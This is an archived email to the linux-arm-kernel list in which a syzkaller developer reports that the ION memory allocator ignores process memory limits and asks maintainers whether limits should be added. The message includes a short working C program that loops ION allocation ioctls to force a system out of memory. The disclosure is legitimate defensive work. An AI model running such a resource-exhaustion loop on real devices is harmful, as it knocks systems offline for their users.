Return-Path: <linux-arm-kernel-bounces+lists+linux-arm-kernel=lfdr.de@lists.infradead.org>
X-Original-To: lists+linux-arm-kernel@lfdr.de
Delivered-To: lists+linux-arm-kernel@lfdr.de
Received: from bombadil.infradead.org (bombadil.infradead.org [IPv6:2607:7c80:54:e::133])
	by mail.lfdr.de (Postfix) with ESMTPS id 5694E6BFA7
	for <lists+linux-arm-kernel@lfdr.de>; Wed, 17 Jul 2019 18:32:20 +0200 (CEST)
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
	d=lists.infradead.org; s=bombadil.20170209; h=Sender:
	Content-Transfer-Encoding:Content-Type:Reply-To:List-Subscribe:List-Help:
	List-Post:List-Archive:List-Unsubscribe:List-Id:MIME-Version:Date:Message-ID:
	Subject:From:To:Cc:Content-ID:Content-Description:Resent-Date:Resent-From:
	Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:References:
	List-Owner; bh=pFuFLJHYHXyB3JPhG8T0Vyv4ZG02PC6J9dPtJl5q/WY=; b=K/HKKh9I9yR6J0
	hJA/7+nvek961r7OczVKXdZTGHb2a9S3/nfLPOXlBdzUAvXYFoT/XOQDizIzxbrbUpAfI7fs92/qE
	wCFquz35yYbe+dqJxoYrKTOf6sHVNsOyMwLFKG+CACjSaD3PT9qHAjYpQTa98ZP5vbnoulwEwdEeW
	OsuAMmAVPToqkLRuVl7DSl27VDNKgxjTjxWaJzfMmJgXhYCEwFG0tkEtt1wViN9Zaodrt14v/d970
	IbrtDiDmomGhnP+pTnmBmzhOmwiC4ovHfOLk24StpsZ24eUeDEbi9LxZjIoKH6wYyrWnr8T4MEKhw
	aRvXVXCmgyLG5FtcbOng==;
Received: from localhost ([127.0.0.1] helo=bombadil.infradead.org)
	by bombadil.infradead.org with esmtp (Exim 4.92 #3 (Red Hat Linux))
	id 1hnmqm-0000ds-48; Wed, 17 Jul 2019 16:32:16 +0000
Received: from mail-lj1-f193.google.com ([209.85.208.193])
 by bombadil.infradead.org with esmtps (Exim 4.92 #3 (Red Hat Linux))
 id 1hnmqZ-0000dY-HW
 for linux-arm-kernel@lists.infradead.org; Wed, 17 Jul 2019 16:32:05 +0000
Received: by mail-lj1-f193.google.com with SMTP id r9so24266653ljg.5
 for <linux-arm-kernel@lists.infradead.org>;
 Wed, 17 Jul 2019 09:32:02 -0700 (PDT)
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
 d=1e100.net; s=20161025;
 h=x-gm-message-state:reply-to:to:from:subject:openpgp:autocrypt
 :message-id:date:user-agent:mime-version:content-language
 :content-transfer-encoding;
 bh=E75NjAXiWhvCZvdE/u04pYeja5zqL3MqVrXHa7H4HfY=;
 b=eZcw8MDVvZMZlqI2mEzlvWbNPxbCuc+VFB0yEyU/eRPGUjqb0mtGmF+0KoZ064bbqa
 Y9xEhdjvlpBag8rj2yEiBBha7Qh8z+FmD5I+vd90Hfp0qdSQ95WA/Sr5pWIbAwD+/pZH
 EQ1d8D2KLkcAiN1GkV3MgbtrdhE1RjNZVjAe7xpCUqCCTUXz7RPZVRlub2f/2Xs2WVUo
 ZJlkBxlKNIUPxTMOreLGiUqPBttH4gp/zouWFTdOvBMbTWQitsdGGeyYcmKGgvH0rkhf
 FlVsFMMeVFZnCjxdUdXuGSGukaKwi+280DnCUc5UG67mRTDNQYBZhqFTMpZVUJDIgY6y
 Cf8Q==
X-Gm-Message-State: APjAAAX2KJ9EyIpnF2WxZJ+UGPXcrKBB8LzeS96GLRH+Bw7N6uU3HEgQ
 y1fQq9xeqNIWL+Hur7OeRNQ=
X-Google-Smtp-Source: APXvYqw8/yzTJs6CxTi/F2Af1OajkefZ36GPQOQNQraarNA3wXnfgWI3z9FIK37oPgVQgrECoeTI2A==
X-Received: by 2002:a2e:7604:: with SMTP id r4mr21491517ljc.225.1563381121256; 
 Wed, 17 Jul 2019 09:32:01 -0700 (PDT)
Received: from [192.168.42.115] ([213.87.160.6])
 by smtp.gmail.com with ESMTPSA id b17sm4573698ljf.34.2019.07.17.09.31.58
 (version=TLS1_2 cipher=ECDHE-RSA-AES128-GCM-SHA256 bits=128/128);
 Wed, 17 Jul 2019 09:32:00 -0700 (PDT)
To: Laura Abbott <labbott@redhat.com>, Sumit Semwal
 <sumit.semwal@linaro.org>, Greg Kroah-Hartman <gregkh@linuxfoundation.org>,
 arve@android.com, Todd Kjos <tkjos@android.com>,
 Martijn Coenen <maco@android.com>, Joel Fernandes <joel@joelfernandes.org>,
 Christian Brauner <christian@brauner.io>,
 Riley Andrews <riandrews@android.com>, devel@driverdev.osuosl.org,
 linaro-mm-sig@lists.linaro.org,
 linux-arm-kernel <linux-arm-kernel@lists.infradead.org>,
 dri-devel@lists.freedesktop.org, LKML <linux-kernel@vger.kernel.org>,
 Brian Starkey <brian.starkey@arm.com>,
 Daniel Vetter <daniel.vetter@intel.com>, Mark Brown <broonie@kernel.org>,
 Benjamin Gaignard <benjamin.gaignard@linaro.org>,
 Linux-MM <linux-mm@kvack.org>, Dmitry Vyukov <dvyukov@google.com>,
 Andrey Konovalov <andreyknvl@google.com>, syzkaller@googlegroups.com
From: Alexander Popov <alex.popov@linux.com>
Subject: Limits for ION Memory Allocator
Openpgp: preference=signencrypt
Autocrypt: addr=alex.popov@linux.com; prefer-encrypt=mutual; keydata=
 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
 jXz/74kjFsyRgZA+d6a1pGtOwITEBxtxxg==
Message-ID: <3b922aa4-c6d4-e4a4-766d-f324ff77f7b5@linux.com>
Date: Wed, 17 Jul 2019 19:31:57 +0300
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101
 Thunderbird/60.7.1
MIME-Version: 1.0
Content-Language: en-US
X-CRM114-Version: 20100106-BlameMichelson ( TRE 0.8.0 (BSD) ) MR-646709E3 
X-CRM114-CacheID: sfid-20190717_093203_591479_823A2263 
X-CRM114-Status: GOOD (  10.67  )
X-Spam-Score: 0.5 (/)
X-Spam-Report: SpamAssassin version 3.4.2 on bombadil.infradead.org summary:
 Content analysis details:   (0.5 points)
 pts rule name              description
 ---- ---------------------- --------------------------------------------------
 -0.0 RCVD_IN_DNSWL_NONE     RBL: Sender listed at https://www.dnswl.org/,
 no trust [209.85.208.193 listed in list.dnswl.org]
 0.0 FREEMAIL_FROM          Sender email is commonly abused enduser mail
 provider (a13xp0p0v88[at]gmail.com)
 -0.0 SPF_PASS               SPF: sender matches SPF record
 0.2 HEADER_FROM_DIFFERENT_DOMAINS From and EnvelopeFrom 2nd level
 mail domains are different
 0.2 FREEMAIL_ENVFROM_END_DIGIT Envelope-from freemail username ends
 in digit (a13xp0p0v88[at]gmail.com)
 0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
 -0.0 RCVD_IN_MSPIKE_H2      RBL: Average reputation (+2)
 [209.85.208.193 listed in wl.mailspike.net]
 0.0 FREEMAIL_FORGED_FROMDOMAIN 2nd level domains in From and
 EnvelopeFrom freemail headers are different
X-BeenThere: linux-arm-kernel@lists.infradead.org
X-Mailman-Version: 2.1.29
Precedence: list
List-Id: <linux-arm-kernel.lists.infradead.org>
List-Unsubscribe: <http://lists.infradead.org/mailman/options/linux-arm-kernel>, 
 <mailto:linux-arm-kernel-request@lists.infradead.org?subject=unsubscribe>
List-Archive: <http://lists.infradead.org/pipermail/linux-arm-kernel/>
List-Post: <mailto:linux-arm-kernel@lists.infradead.org>
List-Help: <mailto:linux-arm-kernel-request@lists.infradead.org?subject=help>
List-Subscribe: <http://lists.infradead.org/mailman/listinfo/linux-arm-kernel>, 
 <mailto:linux-arm-kernel-request@lists.infradead.org?subject=subscribe>
Reply-To: alex.popov@linux.com
Content-Type: text/plain; charset="us-ascii"
Content-Transfer-Encoding: 7bit
Sender: "linux-arm-kernel" <linux-arm-kernel-bounces@lists.infradead.org>
Errors-To: linux-arm-kernel-bounces+lists+linux-arm-kernel=lfdr.de@lists.infradead.org

Hello!

The syzkaller [1] has a trouble with fuzzing the Linux kernel with ION Memory
Allocator.

Syzkaller uses several methods [2] to limit memory consumption of the userspace
processes calling the syscalls for testing the kernel:
 - setrlimit(),
 - cgroups,
 - various sysctl.
But these methods don't work for ION Memory Allocator, so any userspace process
that has access to /dev/ion can bring the system to the out-of-memory state.

An example of a program doing that:


#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>
#include <linux/types.h>
#include <sys/ioctl.h>

#define ION_IOC_MAGIC		'I'
#define ION_IOC_ALLOC		_IOWR(ION_IOC_MAGIC, 0, \
				      struct ion_allocation_data)

struct ion_allocation_data {
	__u64 len;
	__u32 heap_id_mask;
	__u32 flags;
	__u32 fd;
	__u32 unused;
};

int main(void)
{
	unsigned long i = 0;
	int fd = -1;
	struct ion_allocation_data data = {
		.len = 0x13f65d8c,
		.heap_id_mask = 1,
		.flags = 0,
		.fd = -1,
		.unused = 0
	};

	fd = open("/dev/ion", 0);
	if (fd == -1) {
		perror("[-] open /dev/ion");
		return 1;
	}

	while (1) {
		printf("iter %lu\n", i);
		ioctl(fd, ION_IOC_ALLOC, &data);
		i++;
	}

	return 0;
}


I looked through the code of ion_alloc() and didn't find any limit checks.
Is it currently possible to limit ION kernel allocations for some process?

If not, is it a right idea to do that?
Thanks!

Best regards,
Alexander


[1]: https://github.com/google/syzkaller
[2]: https://github.com/google/syzkaller/blob/master/executor/common_linux.h

_______________________________________________
linux-arm-kernel mailing list
linux-arm-kernel@lists.infradead.org
http://lists.infradead.org/mailman/listinfo/linux-arm-kernel
